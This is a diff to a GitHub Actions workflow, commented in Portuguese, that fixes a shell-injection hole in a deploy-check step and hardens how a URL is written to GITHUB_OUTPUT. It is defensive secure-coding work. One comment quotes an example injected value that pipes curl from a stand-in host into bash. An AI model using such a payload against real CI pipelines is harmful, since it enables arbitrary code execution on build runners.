@@ -76,6 +76,24 @@ jobs:
             esac
           fi
           echo "Verificando: $url"
-          echo "url=$url" >> "$GITHUB_OUTPUT"
+          # Delimitador heredoc em vez de `echo "url=$url"`: $url carrega, sem sanitização, o
+          # `inputs.url` livre do workflow_dispatch — uma quebra de linha ali injetaria uma
+          # chave extra no $GITHUB_OUTPUT (o mesmo arquivo de comandos do runner). Sem
+          # consumidor hoje, mas fica fechado por hábito, não pelo caso de uso atual.
+          {
+            echo "url<<__DEPLOY_URL_EOF__"
+            echo "$url"
+            echo "__DEPLOY_URL_EOF__"
+          } >> "$GITHUB_OUTPUT"
+      # TODA entrada passa por `env:` e é lida como "$VAR" no shell — nunca `${{ }}` dentro do
+      # `run:` (mesma regra do atualizar-baseline.yml). A interpolação acontece ANTES do shell
+      # existir: o valor vira texto no meio do script, e `steps.alvo.outputs.url` carrega, sem
+      # sanitização, o `inputs.url` do workflow_dispatch — um `string` livre. Um valor como
+      # `https://x"; curl evil.sh|bash #` quebraria as aspas e executaria comando arbitrário no
+      # runner (CWE-78 / yaml.github-actions.security.run-shell-injection). O Semgrep vendorizado
+      # não pega este caso porque o padrão da regra cobre `github.*`/`inputs.*` diretos, não
+      # `steps.*.outputs.*` — daí não ter aparecido no `./scripts/semgrep.sh`.
       - name: Headers, allowlist e isolamento do Supabase
-        run: node scripts/check_deploy.mjs "${{ steps.alvo.outputs.url }}" "$DEPLOY_ENVIRONMENT"
+        env:
+          DEPLOY_URL_RESOLVIDA: ${{ steps.alvo.outputs.url }}
+        run: node scripts/check_deploy.mjs "$DEPLOY_URL_RESOLVIDA" "$DEPLOY_ENVIRONMENT"
